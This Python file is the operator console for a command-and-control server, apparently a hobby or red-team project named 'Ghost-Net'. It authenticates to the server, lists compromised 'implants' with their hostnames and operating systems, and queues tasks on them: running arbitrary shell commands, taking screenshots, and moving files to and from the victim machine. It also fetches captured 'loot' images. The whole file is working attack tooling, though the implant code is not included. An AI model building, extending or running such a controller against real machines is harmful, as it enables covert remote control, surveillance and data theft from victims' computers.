import argparse
import requests
import os
import tabulate
import json
import base64
import time
from colorama import Fore, Style, init

def display_results(results):
    if not results:
        print("[!] No results to display.")
        return
    
    # Prepare data for tabulation
    table_data = []
    headers = ["Task ID", "Implant ID","Task Type", "Options", "Result", "Timestamp"]
    
    for result in results:
        row = [
            result.get('task_id', ''),
            result.get('implant_id', ''),            
            json.loads(result.get('task_obj', '{}')).get('task_type', ''),
            json.loads(result.get('task_obj', '{}')).get('cmd', ''),
            result.get('result', ''),
            result.get('timestamp', '')   
        ]
        table_data.append(row)
    
    # Print the table
    print(tabulate.tabulate(table_data, headers=headers, tablefmt="grid"))

def display_imlants(results):
    table_data = []
    headers = ['Implant Id', 'hostname', 'OS', 'ARCH', 'os_version',"online"]
    
    for result in results:
        row = [
            result.get('implant_id',''),
            result.get('hostname', ''),
            result.get('os', ''),
            result.get('arch', ''),
            result.get('os_version', ''),
            result.get('is_online','')
        ]
        table_data.append(row)
    print(tabulate.tabulate(table_data,headers=headers,tablefmt='grid'))

def login(server_url):
    try:
        username = input("[?]--Enter the username: ")
        password = input("[?]--Enter the password: ")
        response = requests.post(f'{server_url}/profile/login', json={'username': username, 'password': password})
        response.raise_for_status()
        return response.json().get('access_token')
    except requests.exceptions.RequestException as e:
        print(f"[!] Login failed: {e}")
        return None

def get_implants(server_url, access_token):
    try:
        headers = {'Authorization': f'Bearer {access_token}'}
        response = requests.get(f'{server_url}/implants', headers=headers)
        response.raise_for_status()
        
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"[!] Failed to retrieve implants: {e}")
        return None

def get_results(server_url, implant_id, access_token):
    try:
        headers = {'Authorization': f'Bearer {access_token}'}
        response = requests.get(f'{server_url}/results?implant_id={implant_id}', headers=headers)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"[!] Failed to retrieve results: {e}")
        return None
    
def get_file(server_url, access_token, task_id):
    try:
        headers = {'Authorization': f'Bearer {access_token}'}
        response = requests.get(f'{server_url}/get_file?task_id={task_id}', headers=headers)
        response.raise_for_status()

        if 'image' not in response.headers.get('content-type', ''):
            print("[!] Server did not return an image.")
            return None
        
        save_path = response.headers.get('X-File-Path')
        if not save_path:
            print("[!] Server did not provide a file path.")
            return None

        print(f"[+] Saving image to {save_path}")

        with open(save_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=1024):
                if chunk:
                    f.write(chunk)
        return save_path
    except requests.exceptions.RequestException as e:
        print(f"[!] Failed to retrieve image: {e}")
        return None

def post_task(server_url, implant_id, task_type, cmd,access_token):
    try:
        headers = {'Authorization': f'Bearer {access_token}'}
        data = file_to_base64(cmd) if task_type == 'download' else None
        response = requests.post(f'{server_url}/tasks', headers=headers, json=[{"implant_id": implant_id, "task_type": task_type, "cmd": cmd, "data": data}])
        response.raise_for_status()
        print("[+] Task posted successfully.")
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"[!] Failed to post task: {e}")
        return None
    
def file_to_base64(file_path):
    try:
        with open(file_path, 'rb') as file:
            file_bytes = file.read()
            base64_encoded = base64.b64encode(file_bytes).decode('utf-8')
            return base64_encoded
    except IOError as e:
        print(f"Error reading file {file_path}: {e}")
        return None

def main():
    parser = argparse.ArgumentParser(description="A Python CLI to interact with the C2-server.")
    
    parser.add_argument(
        'action',
        nargs='?',
        choices=['implants', 'tasks', 'results', 'loot', 'exit'],
        help='Action to perform.'
    )
    
    parser.add_argument(
        '--server-url',
        default=os.getenv('C2_SERVER_URL', 'http://localhost:5000'),
        help='The base URL of the C2-server API (default: http://localhost:5000).'
    )
    
    args = parser.parse_args()

    access_token = login(args.server_url)
    while not access_token:
        access_token = login(args.server_url)
    

    try:
        while True:
            if args.action == 'exit':
                print("[+] Exiting C2 CLI.")
                break

            if not args.action:
                args.action = input("--> Welcome to C2 CLI. Please enter a command ('exit' to quit):\n>> ").strip()

            if args.action == 'implants':
                if access_token:
                    implants = get_implants(args.server_url, access_token)
                    if implants:
                        display_imlants(implants)
            elif args.action.startswith('add_task'):
                if access_token:
                    tokens = args.action.split(' ')
                    args.implant_id = tokens[1]
                    args.task_type = tokens[2]
                    if args.task_type == 'screenshot' or args.task_type == 'ping':
                        post_task(args.server_url, args.implant_id, args.task_type, "", access_token)
                    elif args.task_type == 'download':
                        args.file_path = input("[?] Enter the file path to download:\n>> ").strip()
                        post_task(args.server_url, args.implant_id, args.task_type, args.file_path, access_token)
                    elif args.task_type == 'cmd':
                        args.command = input("[?] Enter the command to run:\n>> ").strip()
                        post_task(args.server_url, args.implant_id, args.task_type, args.command, access_token)
                    elif args.task_type == 'upload':
                        args.file_path = input("[?] Enter the file path to upload:\n>> ").strip()
                        post_task(args.server_url, args.implant_id, args.task_type, args.file_path, access_token)
                        
                    
            elif args.action.startswith('results'):
                if access_token:
                    tokens = args.action.split(' ')
                    args.implant_id = tokens[1]
                    results = get_results(args.server_url, args.implant_id, access_token)
                    if results:
                        display_results(results)
            elif args.action.startswith('loot'):
                if access_token:
                    tokens = args.action.split(' ')
                    args.task_id = tokens[1]
                    results = get_file(args.server_url, access_token, args.task_id)
                    if results:
                        print("[+] the path is for the saved file is "+results)
            elif args.action == 'help':
                print("[+] Available commands: implants, tasks, results, loot, exit")
                print("[+] To add a task, use the format 'add_task <implant_id> <task_type>'")
                print("[+] To view results, use the format 'results <implant_id>'")
                print("[+] To view loot, use the format 'loot <task_id>'")
                print("[+] task_type are cmd/screenshot/ping/upload")
            else:
                if args.action != 'exit':
                    print(f"[!] Unknown command '{args.action}'. Please enter a valid command.")
                
            args.action = None  # Reset action to prompt again if not exited
    except KeyboardInterrupt:
        print("\nExiting C2 CLI due to keyboard interrupt.")
    except requests.exceptions.RequestException as e:
        print(f"[!] An error occurred: {e}")

if __name__ == "__main__":
    print(f'''
{Fore.GREEN}        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%##**+==+++*##%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%##+-:...::::....:-=*#%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%#*-..:-==++****++==-..:+#%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%#*-..-==+**#%%%%%%%%%#*+: :+#%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%#+..-=+**#%%@@@@@@@@@@@%%#+: -*#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%#+..-+**#%%%%%%%%%@@@@@%%%%%#- :*#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@%%#*..-+**#%%%%#+-=*%%@@%%#+--+##= -*%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@%%#= :+**#%%%%#-   .*%%%%%*    +#*: +#%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@%%%*:.=***%%%%%#+.  -#%%%%%#=..-#%%= -*###%%%@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@%%%%#*..=**#%%%%%%%####%%%%%%%%##%%%%*..:..:-*#%%@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@%%%%%##+.:=#*%%%%%%%%%%%%%%%%%%%%%%%%%%*:  -=-..+#%%@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@%%%%#+=---=.:=#*#%%%%%%%%%%%%%%%%%%%%%%%%%*+=+*#+=..*#%@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@%%#+..:::.  -+**%%#%%%%%%%%%%%%%%%%%%%%#%%##+#*#*+: +#%%@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@%%#= :-=**++-*+#*%%#%%%%%%%%%%%%%%%%%%%%#%%*****#*+: +#%%@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@%#*:.-+*##*#+#*#*%%#%%#%%%%%%%%%%%%%%%%%#%%++::-*+=: +#%%@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@%%#*..-*+##*#+#*#*#%#%%#%%%%#%%%%%%%%%%%%#%#=..: -=-.:*#%%@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@%%#*:.-++**+*=****#%#%%#%#%%#%%%%%#%%%%%#*+=..++:...:*#%%@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@%%#+..---....-+**##*%%#%#%%#%%#%%#%%%%#*+-..+###***#%%%@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@%%#*-:::=++=.:*+##*#%#%#%%#%%#%%#%%%#+=-..+#%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@%%%%%######*= -+##*%%#%#%%#%%#%%#%#*+-: :+#%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@%%%%%%%%%%#+:.=*#*#%#%##%#%%#%%#*+=-. -*#%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@%%%%%%%%%%#*- =***%%#%#######**+=-:.:+*#%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@%%%%%%%%%%#*- =*#*########**+==-:..-+*#%%%%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@%%%%#*#%%%##*: -*#*####***+==--:..-+**###+*###*-=#%%%#%@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@#*#%%%%%%#*=*####*+..-##*##*+++==-::..-++*+=*##**####%%##*=#%%@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@%###*=#%@@%%%%%#%%%##*- -=**+++===-::..:=+***####*=*##+=+######%%###=-#@@@@@@@@@@@@@@@
        @@@@@@@@@@#++#*%%%%%%%%#=+####*- :-====--::...:-+++**##+=*###%%%%%++###==*%%@%%###+*@@@@@@@@@@@@
        @@@@@@@@##%%#=-+#%%%%%%%%##**+: :::::::....-==+***+######*#%%#####+++#%%%%%%%%#**#*##%#%@@@@@@@@
        @@@@@@@%++#%%#@@%+==+=*#####*-.......::-=++******+-=####*-:-*#%%%%%%%#%@@@%###+--*#%%*=#@@@@@@@@
        @@@@@@@@%@*:.=%%%%+##%%%%%%%##*==++****#######*###**####%%##%##%%%%%#=-+#%%%@@@@@@@%%#+*@@@@@@@@
        @@@@@@@@@@@%%%#%%*%@@@@%*==*##########+######*=*#%%#%%%%%#*=*###+-=#####%%%%%%#%#*#%%#**%@@@@@@@
        @@@@@@@@@@@@@@%-.:*%%%%%%*+##%%%%%##*+-+###%%#*%##*::*###%%%%%###*+###%%%%%%%%#*=-+@@@@@@@@@@@@@
        @@@@@@@@@@@@%%#%%%#%@@@@@#%@%*-:+#%%%%#%%%%%#=-+##%%*%%%%#-:=#%@@@#%@@%%#+=*%%@@%#@@@@@@@@@@@@@@
        @@@@@@@@@@*-=%%%%%%+:=%@*-+##%%%%%%##%*###%%%#+%%%%%#+###%%%%%%###=-=#%%%#*%%%%*-+%@@@@@@@@@@@@@
        @@@@@@@@@@%#%@@@@@@@%#%#*+*#%%%%%%%##+::*#%%%%*%%%##=::*#%%%%%%%%%*=+*@@@@@@@@@#+*@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@*:=%@@@@+::*%%%@@@%%@@%%%%#+**#%%@#%%%%%%%%@@%*%@%++%@@@@@@@%@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@#@@@@@@@#%%%%%%@@%#@@@@%#=-=#%@@@@#@@@@%%%#-..#@@#+%@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@%%#=-+###%%%%%%%####-.:#%%@@@@%#@@@@%@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*%@@@@@@@@@@@@@@%%%@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        
{Style.RESET_ALL}
{Fore.CYAN}                      ________.__                    __             _______          __   
                     /  _____/|  |__   ____  _______/  |_           \      \   _____/  |_ 
                    /   \  ___|  |  \ /  _ \/  ___/\   __\  ______  /   |   \_/ __ \   __\\
                    \    \_\  \   Y  (  <_> )___ \  |  |   /_____/ /    |    \  ___/|  |  
                     \______  /___|  /\____/____  > |__|           \____|__  /\___  >__|  
                            \/     \/           \/                         \/     \/    
{Style.RESET_ALL}
                                                                          
{Fore.RED}                                               enigma - Trez13 

{Style.RESET_ALL}
''')
    main()